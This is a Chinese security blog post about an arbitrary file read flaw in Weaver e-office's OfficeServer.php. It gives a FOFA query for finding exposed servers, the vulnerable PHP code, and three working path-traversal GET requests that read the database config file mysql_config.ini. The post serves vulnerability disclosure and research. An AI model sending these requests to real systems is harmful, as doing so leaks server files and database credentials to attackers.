---
title: "泛微e-office OfficeServer.php 文件读取漏洞"
source: https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-fileread.html
asset_dir: assets/泛微e-office-officeserver.php-文件读取漏洞
---

# 泛微e-office OfficeServer.php 文件读取漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/5/13 08:29
* 937浏览
* [0评论](#comment)
* 22分钟阅读

深入探索

数据库

应用程序

Microsoft Office


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

[泛微](https://mrxn.net/tag/泛微)E-Office是一款标准化的协同 OA 办公软件，泛微协同办公产品系列成员之一,实行通用化产品设计，充分贴合企业管理需求，本着简洁易用、高效智能的原则，为企业快速打造移动化、无纸化、数字化的办公平台。泛微e-office `iWebOffice/OfficeServer.php` 接口 `LOADFILE` 、`GETFILE` 和 `LOADTEMPLATE` 存在任意[文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)漏洞，攻击者可以利用该[漏洞](https://mrxn.net/tag/漏洞)读取服务器上任意文件内容，造成敏感信息泄露。

商务软件和生产力软件

# 影响版本

e-office <=9.5

# fofa语法

> `app="泛微-EOffice"`

# 漏洞分析

深入探索

JSON处理工具

网络安全课程

恶意软件分析工具

## LOADFILE

```
case "LOADFILE" :
    $mFileName = $_REQUEST['FILENAME'];
    $mRecordID = $_REQUEST['RECORDID'];
    $mFullPath = $mFilePath."/".$mRecordID."/".$mFileName;
    $mFullPath = ( "utf-8", "gbk", $mFullPath );
    $result = ( $mFullPath );
    if ( $result == false )
    {
        $MsgError = $_lang['file_file_not_exist'].$mFullPath;
    }
    else
    {
        $fd = ( $mFullPath, "rb" );
        $mFileSize = ( $mFullPath );
        $mFileBody = ( $fd, ( $mFullPath ) );
        ( $fd );
        $MsgObj = $MsgObj."STATUS=".( $_lang['file_open_success']."!" )."\r\n";
    }
    break;
```

因 `FILENAME` 和 `RECORDID` 参数用户可控且无任何过滤或校验，导致可以拼接任意文件路径进行文件操作。

漏洞扫描服务

## GETFILE

```
case "GETFILE" :
    $mRecordID = $RECORDID;
    $mLocalFile = $LOCALFILE;
    $mRemoteFile = $REMOTEFILE;
    $mFilePath = $mFilePath."/".$mRemoteFile;
    $MsgObj->MsgTextClear( );
    if ( $MsgObj->MsgFileLoad( $mFilePath ) )
```

## LOADTEMPLATE

```
case "LOADTEMPLATE" :
    $mTemplate = $TEMPLATE;
    $mFileType = $FILETYPE;
    $mCommand = $COMMAND;
    if ( $mCommand == "INSERTFILE" )
    {
        $MsgObj->MsgTextClear( );
        $result = $MsgObj->MsgFileLoad( $mFilePath."/".$mTemplate );
        if ( !$result )
        {
            $MsgObj->MsgError( "File not exists ".$mFilePath."/".$mTemplate );
        }
        else
        {
            $MsgObj->SetMsgByName( "STATUS", $_lang['file_open_success']."!" );
        }
    }
```

# 漏洞复现

## LOADFILE

```
GET /iWebOffice/OfficeServer.php?OPTION=LOADFILE&FILENAME=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

物流软件安全

[![泛微e-office OfficeServer.php 文件读取漏洞](images/img-001-27ac105df8c6.webp)](https://image.mrxn.net/533b8ad7d3684c9385ff0264b81ff2b1.webp)

## GETFILE

```
GET /iWebOffice/OfficeServer.php?OPTION=GETFILE&REMOTEFILE=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

商务软件和生产力软件

[![泛微e-office OfficeServer.php 文件读取漏洞](images/img-002-518729a120ed.webp)](https://image.mrxn.net/759ed15e022b4822967163a4458f3dee.webp)

## LOADTEMPLATE

```
GET /iWebOffice/OfficeServer.php?OPTION=LOADTEMPLATE&COMMAND=INSERTFILE&TEMPLATE=../mysql_config.ini HTTP/1.1
Host: eoffice.mrxn.net:8082
```

成功读取到 `mysql_config.ini` 文件数据库配置信息

漏洞扫描服务

[![泛微e-office OfficeServer.php 文件读取漏洞](images/img-003-70ada3fa6903.webp)](https://image.mrxn.net/c824b85a36b34288930a51e826eb1188.webp)

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#泛微](https://mrxn.net/tag/%E6%B3%9B%E5%BE%AE)
* [#文件读取](https://mrxn.net/tag/%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [4.1.LOADFILE](#toc-4-1-)
* [4.2.GETFILE](#toc-4-2-)
* [4.3.LOADTEMPLATE](#toc-4-3-)
* [5.漏洞复现](#toc-5-)
* [5.1.LOADFILE](#toc-5-1-)
* [5.2.GETFILE](#toc-5-2-)
* [5.3.LOADTEMPLATE](#toc-5-3-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[泛微e-office OfficeServer.php 文件读取漏洞](https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-fileread.html)  
文章链接：<https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-fileread.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

Windows安全工具

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-iWebOffice-OfficeServer-fileread.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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eH1C8hTeqO6+h/TZfIvc6oqr2y+37wN/bH/VGs38CntO5/SDmZdaZdSTTSWbaj1eSj2ZfcVLtR/trMydea1dnxCf1pvgtpDelOfzzdCX66+wc/avsPM91z5z8s59ha9meA9nmRP1RXXz6uJK19/jthCbLnztE7hbiNvyWG5fXS6aexad8yhvrvGZ+64y6j2zz9K59uXm5KL6d/BuIQ698DVPYPs5xNv3Vn2b9Js/0p3Xfc3Nic6Vi+qfYc+Wi/auZppb+fav0H59udi6PHh9QvIU3qi2hay212+J3Lyo3l9b+6ucfeZXXF00H3S2aKa5enpSctF8vJS6qC9vXPnqmZmS7/u3hezF6/p1T2D7SX11hGwy5TZznXqU17dPnt5U6/rPYmaknBMMPytnJrMvddFeudnW9VuXi+bEla4fvD4heQpvVNvvsp59G8z5Nch7++rm2m995Ttn5asHzTq7eTL70m8003NWujnReebljebNBa9PiE/lTXC5ELfpOeXZYko91yl9UV9UF9Ub28/slHquU/I9Rk85M9f72mdzrWe+sf30pNQb46XUc52Si96nefTlQmJe9fefwHIhZ9vL8bLxVK